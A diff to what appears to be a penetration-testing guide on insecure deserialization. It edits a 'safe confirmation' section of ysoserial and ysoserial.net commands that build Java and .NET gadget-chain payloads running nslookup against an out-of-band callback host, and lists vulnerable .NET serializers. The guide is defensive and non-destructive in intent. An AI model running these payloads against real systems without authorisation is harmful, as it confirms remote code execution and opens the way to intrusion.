@@ -44,13 +44,15 @@ Least-intrusive proof = `id`/`whoami` output or a `sleep`/OOB callback; do not r
 - **.NET:** `BinaryFormatter`, `LosFormatter`/ViewState (`__VIEWSTATE`, exploitable with a known/absent MAC key), `Json.NET TypeNameHandling`, `NetDataContractSerializer`, `SoapFormatter`, `ObjectStateFormatter`.
 
 ### Safe confirmation
+`OOB_HOST` is a callback host you control — a self-hosted interactsh or a private Burp Collaborator server. A public server receives whatever the payload exfiltrates, which on an engagement is client data.
+
 ```bash
 # Java — cleanest dependency-free proof: URLDNS gadget triggers only a DNS lookup, needs NO target library:
-java -jar ysoserial.jar URLDNS "http://OOB_ID.oast.pro" | base64 -w0
+java -jar ysoserial.jar URLDNS "http://OOB_HOST" | base64 -w0
 # a real chain when a vulnerable lib is present (still a benign OOB callback, never a reverse shell):
-java -jar ysoserial.jar CommonsCollections5 'nslookup OOB_ID.oast.pro' | base64 -w0
+java -jar ysoserial.jar CommonsCollections5 'nslookup OOB_HOST' | base64 -w0
 # .NET — ysoserial.net (separate project): -g gadget -f formatter -c command
-ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "nslookup OOB_ID.oast.pro"
+ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "nslookup OOB_HOST"
 # PHP POP chains: phpggc <chain> system id     # Python: a benign __reduce__ that pings OOB
 ```
 - Prove execution with a **DNS/HTTP callback** (OOB) or a timing sleep — the cleanest non-destructive proof for a blind sink. `URLDNS` is best for pure detection: a callback confirms the blob was deserialized even with no RCE gadget on the classpath.
